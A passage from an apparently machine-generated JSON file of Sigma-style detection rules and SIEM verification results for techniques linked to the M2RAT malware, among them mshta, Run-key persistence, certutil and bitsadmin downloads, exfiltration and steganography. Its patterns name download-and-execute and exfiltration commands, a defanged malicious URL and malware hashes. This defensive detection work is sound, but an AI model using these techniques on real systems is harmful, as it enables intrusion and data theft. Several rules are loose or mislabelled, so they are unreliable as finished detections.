            "condition": "selection_certutil or selection_powershell or selection_generic"
          },
          "falsepositives": [
            "Legitimate use of certutil.exe to decode or encode files",
            "PowerShell scripts that embed hex strings for legitimate purposes (e.g., cryptographic operations)",
            "Automation or forensic tools that process JPEG files and may include hex literals"
          ],
          "level": "high",
          "tags": [
            "attack.t1027",
            "attack.defense_evasion",
            "custom.steganography"
          ],
          "ttp_id": "unknown",
          "technique_name": "Steganography",
          "generation_method": "langchain",
          "id": "a6e3dc28-f6bb-486c-b673-0b02f197cd5b",
          "siem_verification": {
            "rule_id": "a6e3dc28-f6bb-486c-b673-0b02f197cd5b",
            "attack_id": "f721c42a-7a09-40c7-8fc1-2b1d02e02b38",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 420.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "MSHTA",
        "status": "success",
        "rule": {
          "title": "Execution of Remote HTA via mshta.exe",
          "description": "Detects execution of mshta.exe with a command line that references a known malicious HTA URL. This indicates the use of mshta to run malicious HTML Application code from a remote source.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_mshta": {
              "Image|endswith": "\\mshta.exe"
            },
            "selection_url": {
              "CommandLine|contains": "hxxps://www.*****elearning.or[.]kr/popup/handle/1.html"
            },
            "condition": "selection_mshta and selection_url"
          },
          "falsepositives": [
            "Legitimate administrative scripts that use mshta.exe to run local HTA files.",
            "System maintenance tools that invoke mshta for UI components."
          ],
          "level": "high",
          "tags": [
            "attack.t1218.005",
            "attack.execution",
            "attack.technique"
          ],
          "ttp_id": "unknown",
          "technique_name": "MSHTA",
          "generation_method": "langchain",
          "id": "c4f9cdf4-f707-4f6f-ad82-f3e52bf660bb",
          "siem_verification": {
            "rule_id": "c4f9cdf4-f707-4f6f-ad82-f3e52bf660bb",
            "attack_id": "3bcb9e12-9913-4a71-bca4-19066df0b27d",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 405.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Autorun Registration",
        "status": "success",
        "rule": {
          "title": "Autorun Registration via RUN Key Command",
          "description": "Detects creation or modification of registry Run keys using reg.exe or PowerShell, indicating persistence attempts by registering executables to run at startup.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_reg": {
              "Image|endswith": "\\reg.exe",
              "CommandLine|contains": [
                "add",
                "Run"
              ]
            },
            "selection_ps": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "Set-ItemProperty",
                "Run"
              ]
            },
            "condition": "selection_reg or selection_ps"
          },
          "falsepositives": [
            "Legitimate software installers that add entries to the Run key",
            "System administration scripts that configure startup programs",
            "Group Policy updates that modify Run keys",
            "Endpoint management tools that enforce startup entries"
          ],
          "level": "high",
          "tags": [
            "attack.persistence",
            "attack.t1547.001",
            "custom.autorun",
            "custom.run_key"
          ],
          "ttp_id": "unknown",
          "technique_name": "Autorun Registration",
          "generation_method": "langchain",
          "id": "791d0625-fdbb-4197-91a2-8b2cdebbc446",
          "siem_verification": {
            "rule_id": "791d0625-fdbb-4197-91a2-8b2cdebbc446",
            "attack_id": "d477b010-d225-4ab7-a1a0-f39b773e7687",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 499.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Command and Control",
        "status": "success",
        "rule": {
          "title": "M2RAT C2 Communication via POST to log.php",
          "description": "Detects processes that send POST requests to the M2RAT command\u2011and\u2011control endpoint (log.php) with the R or U parameters, indicating malicious C2 activity.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "/popup/handle/log.php"
            },
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": "/popup/handle/log.php"
            },
            "condition": "selection_powershell or selection_cmd"
          },
          "falsepositives": [
            "Legitimate monitoring or health\u2011check scripts that POST data to internal web services",
            "Automated deployment tools using PowerShell or batch files to upload logs or status reports",
            "IT administrators running custom scripts that interact with internal portals"
          ],
          "level": "high",
          "tags": [
            "attack.command_and_control",
            "attack.t1071",
            "attack.t1105"
          ],
          "ttp_id": "unknown",
          "technique_name": "Command and Control",
          "generation_method": "langchain",
          "id": "a64cb143-9544-4b88-8ad6-1560e7a831f5",
          "siem_verification": {
            "rule_id": "a64cb143-9544-4b88-8ad6-1560e7a831f5",
            "attack_id": "71c1fc33-9619-4b68-a707-715e243e012e",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 403.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Exfiltration",
        "status": "success",
        "rule": {
          "title": "Exfiltration of PC and Mobile Data via Command-Line Tools",
          "description": "Detects the use of command-line utilities that are commonly leveraged to archive, encode, and exfiltrate personal computer information and mobile phone data. The rule looks for PowerShell compression commands, certutil encoding/decoding, Bitsadmin transfers, and Android Debug Bridge (adb) usage which are indicative of data collection and exfiltration activities.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_powershell_compress": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "Compress-Archive",
                "7z a"
              ]
            },
            "selection_powershell_exfil": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "Invoke-WebRequest",
                "Invoke-RestMethod",
                "Out-File",
                "-EncodedCommand"
              ]
            },
            "selection_certutil_exfil": {
              "Image|endswith": "\\certutil.exe",
              "CommandLine|contains": [
                "-encode",
                "-decode",
                "-urlcache"
              ]
            },
            "selection_bitsadmin_exfil": {
              "Image|endswith": "\\bitsadmin.exe",
              "CommandLine|contains": [
                "/transfer",
                "http",
                "https"
              ]
            },
            "selection_adb_exfil": {
              "Image|endswith": "\\adb.exe",
              "CommandLine|contains": [
                "pull",
                "sync",
                "backup"
              ]
            },
            "condition": "selection_powershell_compress or selection_powershell_exfil or selection_certutil_exfil or selection_bitsadmin_exfil or selection_adb_exfil"
          },
          "falsepositives": [
            "Legitimate system administrators using PowerShell to archive logs or backup files.",
            "IT staff employing certutil for certificate management or encoding files.",
            "Software installers or update mechanisms that use bitsadmin for legitimate downloads.",
            "Developers or testers using adb.exe to pull application data from Android devices for debugging purposes."
          ],
          "level": "high",
          "tags": [
            "attack.exfiltration",
            "attack.t1041",
            "attack.t1020"
          ],
          "ttp_id": "unknown",
          "technique_name": "Exfiltration",
          "generation_method": "langchain",
          "id": "30472f21-100c-45ac-ae61-fd8ab894d515",
          "siem_verification": {
            "rule_id": "30472f21-100c-45ac-ae61-fd8ab894d515",
            "attack_id": "53e83274-4c20-4a5a-9ba1-986f6c6581ab",
            "detected": true,
            "events_found": 2,
            "historical_events": 0,
            "query_time_ms": 562.0,
            "status": "success",
            "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Steganography",
        "status": "success",
        "rule": {
          "title": "Steganography Tool Execution Detection",
          "description": "Detect execution of tools commonly used for steganography to hide malicious payloads within image files. This rule looks for the use of certutil, steghide, exiftool, PowerShell encoded commands, and ImageMagick with image\u2011related arguments that are typical of steganographic activity.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_certutil": {
              "Image|endswith": "\\certutil.exe",
              "CommandLine|contains": [
                "-decode",
                "-encode",
                "-urlcache",
                ".png",
                ".jpg",
                ".bmp"
              ]
            },
            "selection_steghide": {
              "Image|endswith": "\\steghide.exe",
              "CommandLine|contains": [
                "-cf",
                "-ef",
                "-sf"
              ]
            },
            "selection_exiftool": {
              "Image|endswith": "\\exiftool.exe",
              "CommandLine|contains": [
                "-comment",
                "-UserComment",
                "-XMP"
              ]
            },
            "selection_powershell_enc": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "-EncodedCommand",
                ".png",
                ".jpg"
              ]
            },
            "selection_imagemagick": {
              "Image|endswith": "\\magick.exe",
              "CommandLine|contains": [
                "-write",
                "-embed",
                ".png",
                ".jpg"
              ]
            },
            "condition": "selection_certutil or selection_steghide or selection_exiftool or selection_powershell_enc or selection_imagemagick"
          },
          "falsepositives": [
            "Legitimate use of certutil for certificate management or decoding files.",
            "ExifTool usage for metadata editing of images.",
            "ImageMagick (magick.exe) used by graphic designers or automation scripts.",
            "PowerShell -EncodedCommand used by administrators for legitimate scripting.",
            "Steghide or similar utilities used by security researchers or for benign steganography experiments."
          ],
          "level": "high",
          "tags": [
            "attack.t1027.003",
            "attack.defense_evasion",
            "custom.steganography"
          ],
          "ttp_id": "unknown",
          "technique_name": "Steganography",
          "generation_method": "langchain",
          "id": "6c2d2b68-f7c8-4430-abcf-aa6002700ae1",
          "siem_verification": {
            "rule_id": "6c2d2b68-f7c8-4430-abcf-aa6002700ae1",
            "attack_id": "5b1d30e9-d26f-48ff-aea0-a2bccb0431c6",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 498.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "PowerShell",
        "status": "success",
        "rule": {
          "title": "PowerShell Execution with Suspicious Commands",
          "description": "Detects execution of PowerShell with commands commonly used by RedEyes group for data exfiltration and remote control, such as encoded commands, web requests, or remote execution flags.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_enc": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "-enc",
                "-EncodedCommand"
              ]
            },
            "selection_download": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "Invoke-WebRequest",
                "IWR",
                "DownloadFile"
              ]
            },
            "selection_remote": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "-Command",
                "-c"
              ]
            },
            "selection_parent": {
              "ParentImage|endswith": "\\cmd.exe"
            },
            "condition": "(selection_enc or selection_download or selection_remote) and selection_parent"
          },
          "falsepositives": [
            "Legitimate administrative scripts executed via PowerShell",
            "Scheduled tasks that run PowerShell commands",
            "Software installers or update mechanisms using PowerShell",
            "Security or monitoring tools that invoke PowerShell for automation"
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "attack.t1059.001",
            "custom.windows",
            "custom.sysmon",
            "custom.powershell"
          ],
          "ttp_id": "unknown",
          "technique_name": "PowerShell",
          "generation_method": "langchain",
          "id": "a3bf9179-53c7-4f84-b32c-3bc32f5ea862",
          "siem_verification": {
            "rule_id": "a3bf9179-53c7-4f84-b32c-3bc32f5ea862",
            "attack_id": "6e97d35e-b3d4-4f22-b060-adfcf8781b19",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 530.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Data Compression",
        "status": "success",
        "rule": {
          "title": "Compress Files with WinRAR for Exfiltration",
          "description": "Detects execution of WinRAR (rar.exe) with command line arguments indicating compression of files from temporary directories or common document/media extensions, which may be used to prepare data for exfiltration.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_rar": {
              "Image|endswith": "\\rar.exe"
            },
            "selection_temp": {
              "CommandLine|contains": "%TEMP%\\Y_"
            },
            "selection_ext": {
              "CommandLine|contains": [
                ".hwp",
                ".doc",
                ".docx",
                ".xls",
                ".xlsx",
                ".ppt",
                ".pptx",
                ".cell",
                ".csv",
                ".show",
                ".hsdt",
                ".mp3",
                ".amr",
                ".3gp",
                ".m4a",
                ".txt",
                ".png",
                ".jpg",
                ".jpeg",
                ".gif",
                ".pdf",
                ".eml"
              ]
            },
            "condition": "selection_rar and (selection_temp or selection_ext)"
          },
          "falsepositives": [
            "Legitimate use of WinRAR by users to compress files for backup or transfer",
            "Automated backup scripts that archive data to temporary folders using WinRAR",
            "System maintenance tasks that create compressed archives in %TEMP% directory"
          ],
          "level": "high",
          "tags": [
            "attack.t1560",
            "attack.exfiltration",
            "custom.winrar",
            "custom.data-compression"
          ],
          "ttp_id": "unknown",
          "technique_name": "Data Compression",
          "generation_method": "langchain",
          "id": "16cc1a9c-355a-4886-821c-850cc8e668aa",
          "siem_verification": {
            "rule_id": "16cc1a9c-355a-4886-821c-850cc8e668aa",
            "attack_id": "2602dd42-d1b1-487d-b20c-8ed1fbbda429",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 561.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Command and Control",
        "status": "success",
        "rule": {
          "title": "M2RAT Malware Use of Shared Memory for Command and Control",
          "description": "Detects execution of the M2RAT malware or processes that create shared memory sections, which may be used for command and control communication.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_m2rat": {
              "Image|contains": "M2RAT"
            },
            "selection_shmem": {
              "CommandLine|contains": [
                "CreateFileMapping",
                "SharedMemory"
              ]
            },
            "condition": "selection_m2rat or selection_shmem"
          },
          "falsepositives": [
            "Legitimate applications that use shared memory for inter\u2011process communication (e.g., browsers, office suites, Windows Explorer)",
            "System utilities that create file mappings (e.g., rundll32.exe, svchost.exe) for normal operation",
            "Development tools or debugging utilities that may spawn processes with shared memory flags"
          ],
          "level": "high",
          "tags": [
            "attack.command_and_control",
            "custom.m2rat",
            "custom.c2",
            "custom.process_creation"
          ],
          "ttp_id": "unknown",
          "technique_name": "Command and Control",
          "generation_method": "langchain",
          "id": "b059e8f6-aff3-4994-86ef-68f5d1c741d4",
          "siem_verification": {
            "rule_id": "b059e8f6-aff3-4994-86ef-68f5d1c741d4",
            "attack_id": "c448256f-4622-4228-b56b-0ad218feb1d4",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 423.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Keylogging",
        "status": "success",
        "rule": {
          "title": "Potential Keylogging Activity by M2RAT or Similar Tools",
          "description": "Detects creation of processes that are commonly associated with keylogging functionality, such as M2RAT backdoor components or executables/DLLs containing 'keylog' in their name. This helps identify credential access attempts via keylogging.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_m2rat": {
              "Image|endswith": "\\m2rat.exe"
            },
            "selection_keylog_name": {
              "Image|contains": "keylog"
            },
            "selection_rundll_keylog": {
              "Image|endswith": "\\rundll32.exe",
              "CommandLine|contains": "keylog"
            },
            "selection_cmd_keylog": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": "keylog"
            },
            "condition": "selection_m2rat or selection_keylog_name or selection_rundll_keylog or selection_cmd_keylog"
          },
          "falsepositives": [
            "Legitimate security testing tools or debugging utilities that include 'keylog' in their filename.",
            "System administration scripts that use rundll32.exe with DLLs containing 'keylog' for benign purposes.",
            "Custom internal applications named with 'keylog' for logging user actions in a controlled environment."
          ],
          "level": "high",
          "tags": [
            "attack.t1056",
            "attack.credential_access",
            "attack.t1056.001"
          ],
          "ttp_id": "unknown",
          "technique_name": "Keylogging",
          "generation_method": "langchain",
          "id": "3992f9b9-adc8-4599-b63c-36b3c013c38b",
          "siem_verification": {
            "rule_id": "3992f9b9-adc8-4599-b63c-36b3c013c38b",
            "attack_id": "5da834c2-9805-456c-86f2-3ce6adbe26cc",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 534.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Steganography",
        "status": "success",
        "rule": {
          "title": "Steganographic JPEG File Creation Detected via Known Hash",
          "description": "Detect creation of JPEG files whose MD5 hash matches a known steganographic payload (MD5: 93c66ee424daf4c5590e21182592672e). This indicates possible use of steganography for defense evasion.",
          "logsource": {
            "category": "file_event",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "TargetFilename|endswith": ".jpg",
              "Hashes|contains": "93c66ee424daf4c5590e21182592672e"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate image processing or photo editing tools creating or modifying JPEG files (e.g., Photoshop, GIMP, Windows Photo Viewer).",
            "Automated backup or synchronization software that copies JPEG files.",
            "User-initiated saving of JPEG images from browsers or email clients."
          ],
          "level": "high",
          "tags": [
            "attack.steganography",
            "custom.defense_evasion",
            "custom.t1027"
          ],
          "ttp_id": "unknown",
          "technique_name": "Steganography",
          "generation_method": "langchain",
          "id": "a936ff05-9c37-4a0f-b5ae-232f1c4da1f3",
          "siem_verification": {
            "rule_id": "a936ff05-9c37-4a0f-b5ae-232f1c4da1f3",
            "attack_id": "c28e5072-401b-4ff3-8033-5ba88aedc731",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 402.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Infostealer",
        "status": "success",
        "rule": {
          "title": "Infostealer Binary Execution Detected",
          "description": "Detect execution of the known Infostealer/Win.Phone.C5381667 binary identified by its SHA256 hash.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "Hashes|contains": "7f5a72be826ea2fe5f11a16da0178e54"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate software that happens to share the same hash (extremely unlikely)",
            "Security testing or research tools that intentionally execute the sample binary"
          ],
          "level": "high",
          "tags": [
            "attack.collection",
            "custom.infostealer",
            "custom.malware"
          ],
          "ttp_id": "unknown",
          "technique_name": "Infostealer",
          "generation_method": "langchain",
          "id": "74011aae-bac4-425d-a3b1-f20a86e98952",
          "siem_verification": {
            "rule_id": "74011aae-bac4-425d-a3b1-f20a86e98952",
            "attack_id": "a4f439e2-b71a-483a-a896-893588e49eca",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 436.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Scheduled Task/Job",
        "status": "success",
        "rule": {
          "title": "Persistence via Run Registry Key Execution",
          "description": "Detects creation of processes that execute commands targeting the HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run registry key, including usage of cmd.exe to launch PowerShell and the presence of the RyPO indicator, which are commonly used to establish persistence.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": "/c PowerShell.exe"
            },
            "selection_reg": {
              "Image|endswith": "\\reg.exe",
              "CommandLine|contains": "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
            },
            "selection_rypo": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": "RyPO"
            },
            "condition": "selection_cmd or selection_reg or selection_rypo"
          },
          "falsepositives": [
            "Legitimate software installers that write to the Run key during installation",
            "System administrators manually adding entries to the Run key for convenience",
            "Scheduled tasks or startup scripts that invoke cmd.exe or reg.exe with benign parameters",
            "Security tools that query or modify the Run registry for monitoring purposes"
          ],
          "level": "high",
          "tags": [
            "attack.persistence",
            "attack.t1053",
            "custom.windows",
            "custom.sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "Scheduled Task/Job",
          "generation_method": "langchain",
          "id": "f15901e3-9627-43f5-84bc-41efb34e6a65",
          "siem_verification": {
            "rule_id": "f15901e3-9627-43f5-84bc-41efb34e6a65",
            "attack_id": "b97da24d-bfce-4823-999d-e1331fbdf8d3",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 505.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Data Obfuscation",
        "status": "success",
        "rule": {
          "title": "Steganography Embedded in HTTP POST Requests",
          "description": "Detects processes that execute HTTP POST requests containing the keyword 'steganography', indicating possible use of steganography techniques to hide command information in the request body for defense evasion.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "POST",
                "steganography"
              ]
            },
            "selection_curl": {
              "Image|endswith": "\\curl.exe",
              "CommandLine|contains": [
                "POST",
                "steganography"
              ]
            },
            "selection_python": {
              "Image|endswith": "\\python.exe",
              "CommandLine|contains": [
                "POST",
                "steganography"
              ]
            },
            "selection_wget": {
              "Image|endswith": "\\wget.exe",
              "CommandLine|contains": [
                "POST",
                "steganography"
              ]
            },
            "condition": "selection_powershell or selection_curl or selection_python or selection_wget"
          },
          "falsepositives": [
            "Legitimate automation scripts or applications that perform HTTP POST requests with data payloads containing the word 'steganography' (e.g., testing tools, data\u2011processing utilities).",
            "Security or forensic tools that embed metadata in POST bodies for legitimate analysis purposes.",
            "Developers using curl, PowerShell, Python, or wget to interact with internal APIs that may include the term 'steganography' in documentation or parameter names."
          ],
          "level": "high",
          "tags": [
            "attack.t1027",
            "attack.defense_evasion",
            "custom.steganography",
            "custom.network",
            "custom.windows",
            "custom.sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "Data Obfuscation",
          "generation_method": "langchain",
          "id": "05640071-2b35-4a21-af95-a1197dd77b4a",
          "siem_verification": {
            "rule_id": "05640071-2b35-4a21-af95-a1197dd77b4a",
            "attack_id": "a77bb3ff-c10a-43a1-832b-91f57548ee7a",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 435.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "PowerShell",
        "status": "success",
        "rule": {
          "title": "PowerShell Execution with Potentially Malicious Arguments",
          "description": "Detects execution of PowerShell (powershell.exe) with command line arguments commonly used by attackers, such as encoded commands, web requests, or file downloads.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_enc": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "-enc"
            },
            "selection_iwr": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "Invoke-WebRequest"
            },
            "selection_download": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "DownloadFile"
            },
            "selection_iex": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "IEX"
            },
            "condition": "selection_enc or selection_iwr or selection_download or selection_iex"
          },
          "falsepositives": [
            "Legitimate administrative scripts using PowerShell with encoded commands",
            "System management tools that invoke PowerShell for automation",
            "Scheduled tasks or Windows Update processes that run PowerShell"
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "attack.t1059.001",
            "custom.powershell"
          ],
          "ttp_id": "unknown",
          "technique_name": "PowerShell",
          "generation_method": "langchain",
          "id": "8bc85a57-eace-4e23-9577-6d676ea8f33f",
          "siem_verification": {
            "rule_id": "8bc85a57-eace-4e23-9577-6d676ea8f33f",
            "attack_id": "a4359573-1984-4e9c-99fd-ea63c1799886",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 483.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Exploitation for Client Execution",
        "status": "success",
        "rule": {
          "title": "Exploitation for Client Execution via Malicious HWP or EPS Files (CVE-2017-8291)",
          "description": "Detects processes launched to execute code embedded in malicious HWP or EPS files exploiting CVE-2017-8291. The rule looks for suspicious command lines containing the indicator file names or the CVE identifier combined with typical execution binaries.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_hwp_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": "Form.hwp"
            },
            "selection_hwp_ps": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "Form.hwp"
            },
            "selection_eps_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": ".eps"
            },
            "selection_eps_ps": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": ".eps"
            },
            "selection_cve_rundll": {
              "Image|endswith": "\\rundll32.exe",
              "CommandLine|contains": "CVE-2017-8291"
            },
            "condition": "selection_hwp_cmd or selection_hwp_ps or selection_eps_cmd or selection_eps_ps or selection_cve_rundll"
          },
          "falsepositives": [
            "Legitimate opening of .hwp documents with Hancom Office or other HWP viewers.",
            "Normal processing of EPS files by graphic design software (e.g., Adobe Illustrator, CorelDRAW).",
            "System administrators using rundll32.exe with the CVE identifier for testing or documentation purposes."
          ],
          "level": "critical",
          "tags": [
            "attack.t1203",
            "attack.execution",
            "custom.cve-2017-8291",
            "custom.hwp",
            "custom.eps"
          ],
          "ttp_id": "unknown",
          "technique_name": "Exploitation for Client Execution",
          "generation_method": "langchain",
          "id": "b3ad483c-bc60-4c9f-a13d-d86f5af37557",
          "siem_verification": {
            "rule_id": "b3ad483c-bc60-4c9f-a13d-d86f5af37557",
            "attack_id": "48dac5ca-75e5-44ee-9f0c-0474e28015ba",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 480.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "status": "success",
        "rule": {
          "title": "PowerShell Execution with Hidden, NoLogo, NonInteractive, and ExecutionPolicy Bypass",
          "description": "Detects PowerShell processes that are launched with a combination of flags commonly used by attackers to hide execution, suppress output, run non-interactively, and bypass the execution policy (e.g., -WindowStyle hidden, -NoLogo, -NonInteractive, -ep bypass). This behavior aligns with the MITRE ATT&CK technique Command and Scripting Interpreter (T1059) and indicates a high likelihood of malicious activity.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_hidden": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "-WindowStyle hidden"
            },
            "selection_nologo": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "-NoLogo"
            },
            "selection_noninteractive": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "-NonInteractive"
            },
            "selection_epbypass": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "-ep bypass"
            },
            "condition": "selection_hidden and selection_nologo and selection_noninteractive and selection_epbypass"
          },
          "falsepositives": [
            "Legitimate administrative scripts that use PowerShell with hidden windows for background tasks",
            "Scheduled tasks or system maintenance jobs that invoke PowerShell with -NoLogo or -NonInteractive flags",
            "Security or monitoring tools that launch PowerShell in hidden mode for benign purposes"
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "attack.t1059.001",
            "custom.powershell",
            "custom.command_and_scripting_interpreter"
          ],
          "ttp_id": "unknown",
          "technique_name": "Command and Scripting Interpreter",
          "generation_method": "langchain",
          "id": "e2362985-abdc-4629-afe5-24a51647c127",
          "siem_verification": {
            "rule_id": "e2362985-abdc-4629-afe5-24a51647c127",
            "attack_id": "278262a0-4cdc-43e7-93ce-4fb73b8a21fd",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 426.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "PowerShell",
        "status": "success",
        "rule": {
          "title": "Suspicious PowerShell Execution Indicative of Persistence",
          "description": "Detects execution of PowerShell with commands commonly used for persistence such as encoded scripts, scheduled task registration, or new service creation. This helps identify malicious PowerShell activity that may establish long\u2011term footholds on Windows systems.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_enc": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "-enc",
                "-EncodedCommand"
              ]
            },
            "selection_schtask": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "Register-ScheduledTask",
                "New-ScheduledTaskTrigger",
                "New-ScheduledTaskAction"
              ]
            },
            "selection_newservice": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "New-Service",
                "-Name",
                "-BinaryPathName"
              ]
            },
            "condition": "selection_enc or selection_schtask or selection_newservice"
          },
          "falsepositives": [
            "Legitimate administrative scripts using PowerShell for automation",
            "System maintenance tasks that employ encoded PowerShell commands",
            "Scheduled task creation via PowerShell by IT staff",
            "Service creation for legitimate software deployment"
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "attack.t1059.001",
            "custom.powershell"
          ],
          "ttp_id": "unknown",
          "technique_name": "PowerShell",
          "generation_method": "langchain",
          "id": "0b312009-ea21-41aa-95b6-a8e7914e7334",
          "siem_verification": {
            "rule_id": "0b312009-ea21-41aa-95b6-a8e7914e7334",
            "attack_id": "c8fb0468-66f5-4c53-aaa9-1cc4831b7022",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 509.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
